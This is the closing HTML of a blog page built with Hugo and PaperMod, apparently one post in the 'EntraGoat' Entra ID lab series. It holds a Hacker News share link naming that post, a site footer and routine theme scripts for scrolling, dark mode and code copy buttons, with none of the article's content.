        <a target="_blank" rel="noopener noreferrer" aria-label="share EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=EntraGoat%20Scenario%206%3a%20Exploiting%20Chained%20Misconfigurations%20to%20Impersonate%20Global%20Admin%20in%20Entra%20ID&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">TomerN</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
